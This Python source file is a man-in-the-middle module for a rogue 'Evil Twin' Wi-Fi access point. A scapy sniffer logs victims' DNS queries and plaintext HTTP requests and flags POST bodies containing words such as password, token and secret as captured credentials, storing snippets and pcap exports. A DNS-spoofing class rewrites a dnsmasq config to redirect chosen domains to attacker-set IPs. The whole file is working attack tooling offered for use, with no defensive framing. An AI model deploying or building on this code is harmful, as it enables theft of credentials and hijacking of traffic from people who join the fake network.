"""
MITM Module for ARCH // HUNTER
Packet Sniffer + DNS Spoof (works alongside Evil Twin in internet_relay mode)
Linux (Kali) only - requires scapy, dnsmasq running
"""
import threading
import time
import os
import subprocess
import re
from collections import deque
from datetime import datetime

try:
    from scapy.all import sniff, wrpcap, DNS, DNSQR, IP, TCP, UDP, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class MITMSniffer:
    """Packet sniffer using scapy on the Evil Twin AP interface."""

    def __init__(self):
        self.running = False
        self._thread = None
        self._interface = None
        self._filter_mode = "all"
        self._start_time = None

        # Packet storage
        self._packets_summary = deque(maxlen=5000)
        self._raw_packets = []
        self._max_raw = 10000
        self._lock = threading.Lock()

        # Stats
        self.total_packets = 0
        self.http_requests = 0
        self.dns_queries = 0
        self.credentials = 0

    def start(self, interface, filter_mode="all"):
        """Start sniffing on the given interface."""
        if not SCAPY_AVAILABLE:
            return {"status": "error", "message": "scapy not available"}
        if self.running:
            return {"status": "error", "message": "Sniffer already running"}

        self._interface = interface
        self._filter_mode = filter_mode
        self.running = True
        self._start_time = time.time()

        # Reset stats
        self.total_packets = 0
        self.http_requests = 0
        self.dns_queries = 0
        self.credentials = 0
        with self._lock:
            self._packets_summary.clear()
            self._raw_packets.clear()

        self._thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._thread.start()

        return {"status": "success", "message": f"Sniffer started on {interface}"}

    def stop(self):
        """Stop the sniffer."""
        if not self.running:
            return {"status": "error", "message": "Sniffer not running"}

        self.running = False
        self._start_time = None
        return {"status": "success", "message": "Sniffer stopped"}

    def get_packets(self, offset=0, limit=100, filter_type="all"):
        """Get captured packet summaries with pagination."""
        with self._lock:
            packets = list(self._packets_summary)

        # Filter by type
        if filter_type and filter_type != "all":
            packets = [p for p in packets if p.get("type") == filter_type]

        total = len(packets)
        # Return newest first
        packets = list(reversed(packets))
        page = packets[offset:offset + limit]

        return {
            "total": total,
            "offset": offset,
            "limit": limit,
            "packets": page
        }

    def get_stats(self):
        """Get sniffer statistics."""
        elapsed = 0
        if self._start_time and self.running:
            elapsed = int(time.time() - self._start_time)

        return {
            "running": self.running,
            "interface": self._interface,
            "total_packets": self.total_packets,
            "http_requests": self.http_requests,
            "dns_queries": self.dns_queries,
            "credentials": self.credentials,
            "elapsed_seconds": elapsed,
            "buffer_size": len(self._packets_summary)
        }

    def export_pcap(self, filepath=None):
        """Export captured packets to PCAP file."""
        if not filepath:
            captures_dir = os.path.join(os.path.dirname(__file__), "captures")
            os.makedirs(captures_dir, exist_ok=True)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(captures_dir, f"mitm_capture_{ts}.pcap")

        with self._lock:
            packets = list(self._raw_packets)

        if not packets:
            return {"status": "error", "message": "No packets to export"}

        try:
            wrpcap(filepath, packets)
            return {"status": "success", "filepath": filepath, "packet_count": len(packets)}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def _sniff_loop(self):
        """Main sniff loop — runs in background thread."""
        print(f"[MITM] Sniffer started on {self._interface}")
        try:
            sniff(
                iface=self._interface,
                prn=self._process_packet,
                stop_filter=lambda _: not self.running,
                store=0
            )
        except Exception as e:
            print(f"[MITM] Sniffer error: {e}")
        finally:
            self.running = False
            print("[MITM] Sniffer stopped")

    def _process_packet(self, packet):
        """Process a single captured packet."""
        self.total_packets += 1
        now = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        summary = None

        try:
            # DNS queries
            if packet.haslayer(DNS) and packet.haslayer(DNSQR):
                if packet[DNS].qr == 0:  # Query (not response)
                    qname = packet[DNSQR].qname.decode(errors="replace").rstrip(".")
                    src_ip = packet[IP].src if packet.haslayer(IP) else "?"
                    self.dns_queries += 1
                    summary = {
                        "time": now,
                        "type": "dns",
                        "src": src_ip,
                        "dst": qname,
                        "info": f"DNS Query: {qname}",
                        "detail": {"query": qname, "qtype": str(packet[DNSQR].qtype)}
                    }

            # HTTP requests (port 80)
            elif packet.haslayer(TCP) and packet.haslayer(Raw):
                payload = bytes(packet[Raw].load)
                if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                    try:
                        text = payload.decode(errors="replace")
                        # Check for HTTP request methods
                        http_match = re.match(r'^(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)\s+(\S+)\s+HTTP', text)
                        if http_match:
                            method = http_match.group(1)
                            path = http_match.group(2)
                            src_ip = packet[IP].src if packet.haslayer(IP) else "?"
                            dst_ip = packet[IP].dst if packet.haslayer(IP) else "?"

                            # Extract Host header
                            host_match = re.search(r'Host:\s*(\S+)', text, re.IGNORECASE)
                            host = host_match.group(1) if host_match else dst_ip

                            self.http_requests += 1
                            summary = {
                                "time": now,
                                "type": "http",
                                "src": src_ip,
                                "dst": host,
                                "info": f"{method} {host}{path}",
                                "detail": {"method": method, "host": host, "path": path}
                            }

                            # Credential detection in POST bodies
                            if method == "POST":
                                body_start = text.find("\r\n\r\n")
                                if body_start > 0:
                                    body = text[body_start + 4:]
                                    cred_patterns = ["password", "passwd", "pass", "pwd",
                                                     "login", "user", "email", "token",
                                                     "credential", "auth", "secret"]
                                    body_lower = body.lower()
                                    if any(p in body_lower for p in cred_patterns):
                                        self.credentials += 1
                                        summary["type"] = "credential"
                                        summary["info"] = f"POST {host}{path} [CREDENTIAL]"
                                        summary["detail"]["body_snippet"] = body[:200]
                    except Exception:
                        pass

            # Store packet
            if summary:
                with self._lock:
                    self._packets_summary.append(summary)
                    self._raw_packets.append(packet)
                    # Trim raw packets if over limit
                    if len(self._raw_packets) > self._max_raw:
                        self._raw_packets = self._raw_packets[-5000:]

        except Exception as e:
            pass  # Don't crash on malformed packets


class MITMDNSSpoof:
    """DNS Spoofing by modifying dnsmasq config and reloading."""

    DNSMASQ_CONF = "/tmp/eviltwin_dnsmasq.conf"
    SPOOF_MARKER = "# mitm-spoof"

    def __init__(self):
        self.entries = {}  # domain -> ip
        self.active = False

    def add_entry(self, domain, ip):
        """Add a DNS spoof entry."""
        domain = domain.strip().lower()
        ip = ip.strip()
        self.entries[domain] = ip
        # If spoofing is active, apply immediately
        if self.active:
            self._apply_entries()
        return {"status": "success", "message": f"Added: {domain} -> {ip}"}

    def remove_entry(self, domain):
        """Remove a DNS spoof entry."""
        domain = domain.strip().lower()
        if domain in self.entries:
            del self.entries[domain]
            if self.active:
                self._apply_entries()
            return {"status": "success", "message": f"Removed: {domain}"}
        return {"status": "error", "message": f"Entry not found: {domain}"}

    def get_entries(self):
        """Get all spoof entries."""
        return [{"domain": d, "ip": ip} for d, ip in self.entries.items()]

    def start(self):
        """Start DNS spoofing by injecting entries into dnsmasq config."""
        if not self.entries:
            return {"status": "error", "message": "No spoof entries defined"}
        if not os.path.exists(self.DNSMASQ_CONF):
            return {"status": "error", "message": "dnsmasq config not found — is Evil Twin running?"}

        self.active = True
        result = self._apply_entries()
        if result:
            return {"status": "success", "message": f"DNS spoofing active ({len(self.entries)} entries)"}
        return {"status": "error", "message": "Failed to apply DNS spoof entries"}

    def stop(self):
        """Stop DNS spoofing — remove injected entries from dnsmasq."""
        self.active = False
        self._restore_dnsmasq()
        return {"status": "success", "message": "DNS spoofing stopped"}

    def get_status(self):
        """Get DNS spoof status."""
        return {
            "active": self.active,
            "entry_count": len(self.entries),
            "entries": self.get_entries()
        }

    def _apply_entries(self):
        """Write spoof entries to dnsmasq config and reload."""
        try:
            if not os.path.exists(self.DNSMASQ_CONF):
                return False

            # Read current config, remove old spoof lines
            with open(self.DNSMASQ_CONF, "r") as f:
                lines = f.readlines()

            clean_lines = [l for l in lines if self.SPOOF_MARKER not in l]

            # Add new spoof entries
            for domain, ip in self.entries.items():
                clean_lines.append(f"address=/{domain}/{ip} {self.SPOOF_MARKER}\n")

            with open(self.DNSMASQ_CONF, "w") as f:
                f.writelines(clean_lines)

            # Reload dnsmasq
            subprocess.run(["pkill", "-HUP", "dnsmasq"], capture_output=True, timeout=5)
            print(f"[MITM] DNS spoof applied: {len(self.entries)} entries")
            return True

        except Exception as e:
            print(f"[MITM] DNS spoof apply error: {e}")
            return False

    def _restore_dnsmasq(self):
        """Remove all spoof entries from dnsmasq config and reload."""
        try:
            if not os.path.exists(self.DNSMASQ_CONF):
                return

            with open(self.DNSMASQ_CONF, "r") as f:
                lines = f.readlines()

            clean_lines = [l for l in lines if self.SPOOF_MARKER not in l]

            with open(self.DNSMASQ_CONF, "w") as f:
                f.writelines(clean_lines)

            subprocess.run(["pkill", "-HUP", "dnsmasq"], capture_output=True, timeout=5)
            print("[MITM] DNS spoof entries removed, dnsmasq reloaded")

        except Exception as e:
            print(f"[MITM] DNS spoof restore error: {e}")


class MITMManager:
    """Top-level manager combining Sniffer + DNS Spoof."""

    def __init__(self):
        self.sniffer = MITMSniffer()
        self.dns_spoof = MITMDNSSpoof()

    def get_status(self):
        """Combined MITM status for WebSocket."""
        return {
            "sniffer": self.sniffer.get_stats(),
            "dns_spoof": self.dns_spoof.get_status()
        }
